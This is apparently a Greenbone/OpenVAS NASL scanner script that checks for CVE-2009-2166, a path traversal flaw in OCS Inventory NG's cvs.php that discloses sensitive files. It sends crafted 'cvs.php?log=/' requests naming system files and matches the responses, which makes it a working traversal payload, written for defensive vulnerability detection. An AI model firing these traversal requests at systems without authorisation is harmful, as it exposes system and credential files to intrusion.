CPE = "cpe:/a:ocsinventory-ng:ocs_inventory_ng";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.900378" );
	script_version( "2021-09-01T12:57:33+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 12:57:33 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2009-06-26 07:55:21 +0200 (Fri, 26 Jun 2009)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2009-2166" );
	script_name( "OCS Inventory NG 'cvs.php' Information Disclosure Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_ocs_inventory_ng_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "ocs_inventory_ng/detected" );
	script_xref( name: "URL", value: "http://www.milw0rm.com/exploits/8868" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/50946" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to cause path traversal attack,
  and gain sensitive information." );
	script_tag( name: "affected", value: "OCS Inventory NG version prior to 1.02.1." );
	script_tag( name: "insight", value: "The flaw is due to improper sanitization of user supplied input through the
  'cvs.php' file which can exploited by sending a direct request to the 'log' parameter." );
	script_tag( name: "solution", value: "Upgrade to OCS Inventory NG version 1.02.1 or later." );
	script_tag( name: "summary", value: "This host is running OCS Inventory NG and is prone to Information
  Disclosure vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/cvs.php?log=/" + files[file];
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

